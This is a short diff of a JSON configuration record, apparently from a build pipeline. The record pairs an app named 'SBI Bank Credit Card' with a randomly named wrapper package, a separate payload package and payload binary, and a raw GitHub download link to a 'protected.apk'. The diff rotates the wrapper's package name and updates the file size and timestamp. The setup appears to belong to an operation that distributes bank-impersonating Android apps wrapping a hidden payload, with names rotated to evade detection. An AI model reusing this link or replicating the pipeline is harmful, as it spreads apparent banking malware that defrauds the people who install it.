@@ -2,10 +2,10 @@
   "user_id": 7771105502,
   "slot": 6,
   "app_name": "SBI Bank Credit Card",
-  "wrap_package": "ewi.ss7iej.s5rg.gocfs",
+  "wrap_package": "nad.uoi3tr.xju5.c11t2",
   "payload_package": "im0.kdhbxp.k6mm.u25lf",
   "wrap_bin": "im0.kdhbxp.k6mm.u25lf.bin",
   "cdn_url": "https://raw.githubusercontent.com/mohanqquiku/Private-Database/main/users/7771105502/app6/output/protected.apk",
-  "size": 1023561,
-  "updated_at": "2026-11-28T06:03:01.295Z"
+  "size": 1020835,
+  "updated_at": "2026-11-28T06:09:40.869Z"
 }
